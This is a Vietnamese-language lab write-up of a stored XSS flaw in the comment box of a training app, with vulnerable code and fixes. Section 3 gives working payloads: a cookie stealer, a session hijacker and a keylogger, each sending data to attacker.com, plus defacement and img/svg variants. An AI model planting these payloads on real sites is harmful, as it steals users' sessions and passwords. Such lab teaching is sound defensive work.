# Cross-Site Scripting (XSS) — Writeup

> **Mức độ:** High  
> **Vị trí:** `/comments` — Comment box  
> **Loại:** Stored XSS (Persistent XSS)  
> **CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation

---

## 1. XSS là gì?

Cross-Site Scripting (XSS) xảy ra khi ứng dụng nhận input của user và render nó thành HTML/JavaScript mà không sanitize. Kẻ tấn công có thể inject code JavaScript thực thi trong trình duyệt của nạn nhân.

**3 loại XSS:**
- **Stored (Persistent):** Payload lưu vào database, load lại mỗi lần trang được request → nguy hiểm nhất
- **Reflected:** Payload trong URL, chỉ tấn công người click link
- **DOM-based:** Payload thao tác DOM phía client

VulnWebApp sử dụng **Stored XSS**.

---

## 2. Vị trí lỗi trong VulnWebApp

### Server-side (lưu input không sanitize)

```javascript
// server.js
app.post('/comments', (req, res) => {
  const { content } = req.body;
  // Raw content stored directly — no sanitization
  db.prepare('INSERT INTO comments (user_id, content) VALUES (?, ?)').run(userId, content);
});
```

### Template (render unescaped HTML)

```html
<!-- comments.ejs -->
<!-- <%- %> = unescaped output → XSS -->
<div class="comment-body"><%- comment.content %></div>

<!-- Safe: <%= %> = escaped output -->
<!-- <div class="comment-body"><%= comment.content %></div> -->
```

---

## 3. Cách khai thác

### 3.1 Basic Alert (Proof of Concept)

**Payload:**
```html
<script>alert('XSS by Hacker')</script>
```

**Bước thực hiện:**
1. Login vào app
2. Truy cập `http://localhost:3000/comments`
3. Nhập payload vào comment box
4. Submit
5. Popup `alert()` xuất hiện ngay (và mỗi lần ai vào trang)

---

### 3.2 Cookie Stealer (Thực tế nguy hiểm)

**Payload:**
```html
<script>
  new Image().src = 'http://attacker.com/steal?c=' + encodeURIComponent(document.cookie);
</script>
```

**Kết quả:** Mỗi user truy cập `/comments` sẽ gửi cookie session của họ đến server attacker.

---

### 3.3 Session Hijacking

**Payload:**
```html
<script>
  fetch('http://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookie: document.cookie,
      url: location.href,
      userAgent: navigator.userAgent
    })
  });
</script>
```

---

### 3.4 Defacement

```html
<script>
  document.body.innerHTML = '<h1 style="color:red;text-align:center">HACKED BY ATTACKER</h1>';
</script>
```

---

### 3.5 Keylogger

```html
<script>
  document.addEventListener('keypress', e => {
    new Image().src = 'http://attacker.com/log?k=' + e.key;
  });
</script>
```

### 3.6 IMG Tag (bypass script filter)

```html
<img src=x onerror="alert(document.cookie)">
```

### 3.7 SVG Payload

```html
<svg onload="alert('XSS via SVG')">
```

---

## 4. Kết quả

| Payload | Impact |
|---------|--------|
| `<script>alert()</script>` | Proof of concept |
| Cookie stealer | Chiếm phiên đăng nhập của admin |
| Keylogger | Thu thập password người dùng |
| Defacement | Xóa nội dung trang |

---

## 5. Demo với BurpSuite

1. Proxy → Intercept ON
2. Submit comment form
3. Trong request body: `content=<script>alert(1)</script>`
4. Forward
5. Truy cập `/comments` → observe script execution

---

## 6. Cách Fix 

### Fix 1: Dùng `<%= %>` thay vì `<%- %>` trong EJS

```html
<!-- SECURE — EJS tự escape HTML entities -->
<div class="comment-body"><%= comment.content %></div>

<!-- Output: &lt;script&gt;alert()&lt;/script&gt; (không thực thi) -->
```

### Fix 2: Sanitize input trước khi lưu

```javascript
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

const clean = DOMPurify.sanitize(content);
db.prepare('INSERT INTO comments (user_id, content) VALUES (?, ?)').run(userId, clean);
```

### Fix 3: Content Security Policy (CSP) Header

```javascript
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', 
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'");
  next();
});
```

### Fix 4: HttpOnly Cookie

```javascript
// Trong session config:
cookie: {
  httpOnly: true,   // JS không thể đọc cookie
  secure: true,     // Chỉ gửi qua HTTPS
  sameSite: 'strict'
}
```

---

## 7. Tham khảo

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger — XSS](https://portswigger.net/web-security/cross-site-scripting)
- [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
